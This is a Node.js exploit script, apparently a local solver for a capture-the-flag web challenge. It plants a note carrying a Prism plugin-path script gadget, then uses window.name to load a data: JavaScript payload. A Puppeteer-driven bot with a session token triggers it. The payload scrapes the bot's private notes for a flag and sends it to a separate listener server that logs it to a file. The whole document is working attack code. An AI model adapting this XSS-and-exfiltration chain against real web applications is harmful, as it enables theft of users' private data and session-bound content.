const path = require("path");
const http = require("http");
const fs = require("fs");
const puppeteer = require(path.resolve(__dirname, "../challenge_mouse/bot/node_modules/puppeteer-core"));

const APP = "http://127.0.0.1:3000";
const CHROME = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
const body = "<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)#>";
const FULLCODE = `console.log('FULLCODE-RAN');
const o=location.origin;
const html=async u=>{const r=await fetch(u,{cache:'force-cache'});return r.text()};
(async()=>{
 try{
  console.log('fetch list...');
  const t=await html(o+'/notes/?search=');
  console.log('list status? len', t.length, 'head', t.slice(0,60).replace(/\\n/g,' '));
  const ids=[...t.matchAll(/href="\\/notes\\/([a-f0-9]{8})"/g)].map(m=>m[1]);
  console.log('ids', JSON.stringify(ids));
  for(const id of ids){
   try{
    const p=await html(o+'/notes/'+id);
    console.log('note', id, 'hasFlagDraft', p.includes('flag draft'), 'len', p.length);
    if(p.includes('flag draft')){
     const flag=(p.match(/<main>([\\s\\S]*?)<\\/main>/)||[])[1]||'NONE';
     console.log('*** FLAG FOUND:', flag.trim());
     try{history.replaceState(null,'','/')}catch(e){console.log('rs err',e.message)}
     location.href='http://127.0.0.1:8000/c?f='+encodeURIComponent(flag.trim());
     return;
    }
   }catch(e){console.log('note err',id,e.message)}
  }
  console.log('NOTFOUND path');
  try{history.replaceState(null,'','/')}catch(e){}
  location.href='http://127.0.0.1:8000/c?f=NOTFOUND';
 }catch(e){console.log('outer err', e.message, e.stack)
  try{history.replaceState(null,'','/')}catch(e2){}
  location.href='http://127.0.0.1:8000/c?f=ERR:'+encodeURIComponent(e.message)}
})();
`;

const server = http.createServer((req, res) => {
  console.log("[SRV]", req.method, req.url);
  if (req.url.startsWith("/atk")) {
    res.setHeader("Content-Type", "text/html");
    const nid = decodeURIComponent((req.url.split("?n=")[1] || "").split("&")[0]);
    const data = "data:text/javascript," + encodeURIComponent(FULLCODE);
    res.end(`<!doctype html><html><body>
<script>
var w=window.open(${JSON.stringify(APP + "/notes/?search=")});
console.log('seed popup:', w ? 'ok' : 'BLOCKED');
window.name=${JSON.stringify(data)};
setTimeout(function(){location.href=${JSON.stringify(APP + "/notes/")}+${JSON.stringify(nid)}},500);
</script></body></html>`);
    return;
  }
  if (req.url.startsWith("/c")) { fs.appendFileSync("flag_local.txt", decodeURIComponent(req.url)+"\n"); console.log("[FLAG-LOCAL]", decodeURIComponent(req.url)); res.end("ok"); return; }
  res.end("ok");
});

server.listen(8000, "127.0.0.1", async () => {
  const postData = "title=hi&body=" + encodeURIComponent(body);
  const noteId = await new Promise((resolve, reject) => {
    const req = http.request(APP + "/notes", { method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": Buffer.byteLength(postData), "Sec-Fetch-Mode": "navigate" } },
      res => resolve((res.headers.location || "").split("/").pop()));
    req.on("error", reject);
    req.write(postData); req.end();
  });
  console.log("[+] note:", noteId);

  const browser = await puppeteer.launch({ headless: "new", executablePath: CHROME,
    args: ["--no-sandbox", "--disable-dev-shm-usage", "--js-flags=--jitless"] });
  const page = await browser.newPage();
  page.on("console", m => console.log("[CONSOLE]", m.text()));
  page.on("requestfailed", r => console.log("[REQFAIL]", r.url(), r.failure()?.errorText));
  page.on("response", r => console.log("[RESP]", r.status(), r.url()));

  await page.setRequestInterception(true);
  page.on("request", request => {
    const externalNavigation = page.url().startsWith(`${APP}/notes/`)
      && request.isNavigationRequest()
      && request.frame() === page.mainFrame()
      && new URL(request.url()).origin !== APP;
    if (externalNavigation) console.log("[ABORT]", request.url());
    externalNavigation ? request.abort() : request.continue();
  });

  await page.setExtraHTTPHeaders({ "X-Bot-Token": "bot-token" });
  await page.goto(`${APP}/bot/session`, { waitUntil: "domcontentloaded" });
  await page.setExtraHTTPHeaders({});

  await page.goto(`http://127.0.0.1:8000/atk?n=${noteId}`, { timeout: 5000, waitUntil: "domcontentloaded" });
  await new Promise(r => setTimeout(r, 15000));
  await browser.close();
  server.close();
  process.exit(0);
});